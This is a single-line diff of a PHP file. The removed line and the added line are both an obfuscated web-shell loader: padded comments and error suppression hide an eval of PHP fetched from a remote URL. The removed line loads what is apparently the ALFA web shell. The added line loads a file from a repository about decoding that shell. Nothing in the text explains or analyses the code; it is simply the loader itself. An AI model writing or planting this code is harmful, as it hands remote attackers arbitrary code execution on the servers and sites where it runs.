@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/zycoder0day/alfa/main/alf2.php7"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/raminfp/DeObfuscation_ALFA_SHELL_V3/blob/master/decode_stage_2.php"));/**/?>
